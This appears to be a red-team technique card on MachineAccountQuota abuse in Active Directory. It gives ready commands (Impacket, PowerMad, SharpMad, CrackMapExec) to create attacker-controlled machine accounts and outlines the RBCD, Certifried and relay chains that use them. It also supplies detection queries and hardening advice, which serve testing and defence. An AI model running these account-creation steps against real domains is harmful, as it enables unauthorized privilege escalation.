name: MachineAccountQuota (MAQ) Abuse - Adding Computer Accounts
description: By default, any domain user can add up to 10 computer accounts (ms-DS-MachineAccountQuota=10). These machine accounts can be used for RBCD attacks, Certifried exploitation, relaying, and Kerberos abuse. Checking and exploiting MAQ is a critical first step in many AD attack chains.
source: CRTP MAQ abuse; AD attack chains
notes:
=== CHECK MAQ VALUE ===
  # CrackMapExec:
  crackmapexec ldap <dc_ip> -u <user> -p <pass> -M maq
  # LDAP query:
  ldapsearch -x -H ldap://<dc_ip> -D "<user>@<domain>" -w "<pass>" -b "DC=<domain>,DC=local" "(objectClass=domain)" ms-DS-MachineAccountQuota
  # PowerShell:
  Get-ADObject -Identity "DC=<domain>,DC=local" -Properties ms-DS-MachineAccountQuota

=== ADD COMPUTER ACCOUNT ===
  # Impacket:
  addcomputer.py -computer-name EVIL$ -computer-pass Password123 <domain>/<user>:<pass>
  # PowerMad:
  New-MachineAccount -MachineAccount EVIL -Password $(ConvertTo-SecureString "Password123" -AsPlainText -Force)
  # SharpMad:
  SharpMad.exe add EVIL$ Password123

=== ATTACK CHAINS REQUIRING MAQ ===
  1. RBCD: Create machine -> delegate to target -> S4U2Self/Proxy
  2. Certifried: Create machine -> spoof DC DNS -> request cert
  3. Relay to LDAP: Relay auth -> create machine -> RBCD
  4. Shadow Credentials: Machine account as delegation target

=== DEFENSIVE VALUE ===
  # Set MAQ to 0:
  Set-ADDomain -Identity <domain> -Replace @{"ms-DS-MachineAccountQuota"="0"}
  # This blocks many attack chains that rely on machine account creation

recommended.note: addcomputer.py for creating the machine account.
RBCD attack chain using the created machine account.
Certifried requires MAQ for machine account creation.

defense.why_it_works: The default MachineAccountQuota of 10 allows any authenticated user to create computer accounts. These accounts can then be used as controlled principals for delegation attacks.
defense.impact: Creates controlled machine accounts for RBCD, Certifried, relay, and other attack chains.
defense.detection: [MITRE T1136.002] Event 4741 (computer account created) by non-admin users.
defense.artifacts: Event 4741 with SubjectUserName as regular user; new computer object in default Computers OU.
defense.splunk_spl:
index=windows EventCode=4741
| where SubjectUserName NOT IN ("SYSTEM", "Administrator", "*svc*")
| table _time, SubjectUserName, TargetUserName, SubjectDomainName
defense.elastic_kql: event.code:"4741" AND NOT user.name:(SYSTEM OR Administrator)
defense.sentinel_kql:
SecurityEvent
| where EventID == 4741
| where SubjectUserName !in ("SYSTEM", "Administrator")
| project TimeGenerated, SubjectUserName, TargetUserName, Computer
defense.prevention: Set ms-DS-MachineAccountQuota to 0; delegate machine account creation to specific groups only; monitor Event 4741.

detections.name: Non-admin computer account creation (MAQ abuse)
detections.logic:
SecurityEvent
| where EventID == 4741
| where SubjectUserName !in~ ("SYSTEM", "Administrator")
| where SubjectUserName !has "svc"
| project TimeGenerated, SubjectUserName, TargetUserName, Computer
detections.false_positives: Help desk joining workstations to domain; SCCM/MDM provisioning
detections.tuning: Whitelist known provisioning service accounts; alert on any other user creating computer accounts
